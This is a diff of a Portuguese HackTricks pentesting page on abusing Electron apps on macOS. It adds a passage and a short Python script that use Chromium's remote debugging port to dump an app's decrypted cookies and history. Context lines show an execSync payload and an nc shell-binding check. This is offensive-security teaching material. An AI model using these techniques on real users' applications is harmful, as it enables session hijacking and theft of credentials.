@@ -172,9 +172,19 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% hint style="danger" %}
 Se o fusível **`EnableNodeCliInspectArguments`** estiver desativado, o aplicativo **ignorará os parâmetros do node** (como `--inspect`) ao ser iniciado, a menos que a variável de ambiente **`ELECTRON_RUN_AS_NODE`** seja definida, o que também será **ignorado** se o fusível **`RunAsNode`** estiver desativado.
 
-No entanto, ainda é possível usar o parâmetro do electron `--remote-debugging-port=9229`, mas a carga útil anterior não funcionará para executar outros processos.
+No entanto, ainda é possível usar o parâmetro do Electron `--remote-debugging-port=9229`, mas a carga útil anterior não funcionará para executar outros processos.
 {% endhint %}
 
+Usando o parâmetro **`--remote-debugging-port=9222`**, é possível roubar algumas informações do aplicativo Electron, como o **histórico** (com comandos GET) ou os **cookies** do navegador (pois eles são **descriptografados** dentro do navegador e há um **endpoint json** que os fornecerá).
+
+Você pode aprender como fazer isso [**aqui**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) e [**aqui**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) e usar a ferramenta automática [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ou um simples script como:
+```python
+import websocket
+ws = websocket.WebSocket()
+ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
+ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
+print(ws.recv()
+```
 ### Injeção a partir do App Plist
 
 Você pode abusar dessa variável de ambiente em um plist para manter a persistência adicionando estas chaves:
@@ -251,6 +261,6 @@ Shell binding requested. Check `nc 127.0.0.1 12345`
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
